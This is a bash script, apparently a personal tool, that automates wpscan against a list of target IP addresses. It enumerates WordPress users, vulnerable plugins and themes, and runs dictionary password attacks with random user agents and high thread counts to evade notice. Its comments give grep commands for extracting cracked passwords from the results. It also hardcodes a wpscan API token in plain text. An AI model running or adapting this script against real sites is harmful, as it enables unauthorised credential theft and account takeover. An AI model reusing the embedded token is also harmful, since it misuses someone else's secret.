
#!/bin/bash
# A script for auto brute forcing users based on wpscan



clear

printf "${BLUE}\n########################################################################\n${NORMAL}"
printf "${RED}##                 WordPress Auto Brute                              ##${NORMAL}\n"
printf "${RED}##                     Leighton-0    (Jan 2023)                       ##${NORMAL}"
printf "${BLUE}\n########################################################################${NORMAL}\n"

sleep 3
#"result.${d}.parsed""result.${d}.parsed"

D=`date +"%y%m%d"`						# creates a date variable in the form yymmdd
rm results*
rm counter.txt
printf "${RED} Results for $1 ${NORMAL}\n"
I=0
wl_pass=~/mycode/reconftw/Recon/$1/hosts/ips.txt

wpscan --update

##read -p $'\e[1;92m File path for targets: \e[0m' wl_pass	# -p prompt asks for a file name for the list of sites - names this site wl_pass
wl_pass="${wl_pass}"						# creates a variable called wp_pass
count_pass=$(wc -l $wl_pass | cut -d " " -f1)			# counts the number of lines in wp_pass file
								# cut -d " " -f1 -->> takes the only the numerical value from the wc -l output (eg 70 wp-links)
for fn in `cat $wl_pass`; do
#printf "%s ${RED}TARGET NAME:- \n" $fn ${NORMAL}\n >> "results.${D}"
printf "${RED}\n================================================================================$NORMAL\n" >> "results.${D}"
printf "TARGET NAME:- %s \n" ${fn} >> "results.${D}"

password_brute() {			# Designed to identify uses and carry out dictionary attack
	 wpscan --url $fn -e  u vp vt --passwords z_passwords --no-banner --no-update --random-user-agent --max-threads 20 --ignore-main-redirect --force >> "results.${D}"
}

wp_confirm() {				# Designed to identify which sites are running WP from a file of IP addresses
	wpscan --url $fn --no-update --force --random-user-agent --ignore-main-redirect --wp-version-detection aggressive --no-banner --api-token --api-token s3KWluzJG9MQYtsy413EWzWm419hAUmdhs8sUaAWPhQ >> "results.${D}"
					# --force disable WP detection; --wp-version-detection aggressive
}

I=$((I+1))
printf "Loop number %-1d of %-.3d \n" $I  $count_pass >> counter.txt


: << 'COMMENT'
##########  BY ME   #################
BLOCK COMMENT ANYTHING IN HERE
######################################
COMMENT

#done
wp_confirm

printf "Finished - check the results"
printf '\n\n\n\n'

cat "results.${D}"
done

#   README
#   Usefull for parsing results
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2

#   TO DO
#   Improve Parsing
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2
# cat results | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > "results.${d}.parsed" 

# cat results.${d} | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > "results.${d}.parsed"

# cat results.${d}.parsed

#   README
#   Usefull for parsing results
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2

#   TO DO
#   Improve Parsing
#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2

